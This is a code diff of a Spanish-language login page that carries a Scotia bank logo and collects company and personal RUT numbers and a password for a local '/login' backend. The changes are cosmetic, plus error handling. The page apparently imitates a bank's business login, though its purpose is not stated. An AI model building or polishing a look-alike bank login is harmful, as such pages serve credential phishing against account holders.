@@ -15,7 +15,7 @@
       box-shadow: 0 2px 5px rgba(0,0,0,0.2);
     }
     .top-bar img {
-      height: 20px;
+      height: 30px;
     }
     .form-card {
       background: #fff;
@@ -38,13 +38,20 @@
     .extra-link a:hover {
       text-decoration: underline;
     }
+    /* Imagen más pequeña en escritorio */
+    @media (min-width: 768px) {
+      .aviso-img {
+        max-width: 70%;
+        height: auto;
+      }
+    }
   </style>
 </head>
 <body>
   <!-- Franja superior -->
   <nav class="top-bar navbar navbar-expand-lg fixed-top">
     <div class="container-fluid">
-      <!-- Logo a la izquierda en escritorio, centrado en móvil -->
+      <!-- Logo -->
       <a class="navbar-brand mx-auto mx-lg-0" href="#">
         <img src="ScotiaLogo.svg" alt="Logo Empresa">
       </a>
@@ -57,7 +64,7 @@
 
   <!-- Contenido principal -->
   <div class="container mt-5 pt-5">
-    <div class="row align-items-center">
+    <div class="row align-items-start">
       <!-- Formulario -->
       <div class="col-12 col-md-6 mb-4">
         <div class="form-card">
@@ -89,7 +96,7 @@
 
       <!-- Imagen -->
       <div class="col-12 col-md-6 text-center">
-        <img src="aviso-ggee.jpg" alt="Aviso Empresa" class="img-fluid rounded shadow">
+        <img src="aviso-ggee.jpg" alt="Aviso Empresa" class="img-fluid rounded shadow aviso-img">
       </div>
     </div>
   </div>
@@ -97,6 +104,7 @@
   <!-- Bootstrap JS -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
+  <!-- Script envío a backend -->
   <script>
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -104,14 +112,19 @@
       const rutPersona = document.getElementById('rutPersona').value;
       const passwd = document.getElementById('passwd').value;
 
-      const res = await fetch('/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ rutEmpresa, rutPersona, passwd })
-      });
+      try {
+        const res = await fetch('/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ rutEmpresa, rutPersona, passwd })
+        });
 
-      const data = await res.text();
-      document.getElementById('message').textContent = data;
+        const data = await res.text();
+        document.getElementById('message').textContent = data;
+      } catch (error) {
+        document.getElementById('message').textContent = 'Error al enviar datos';
+        console.error(error);
+      }
     });
   </script>
 </body>
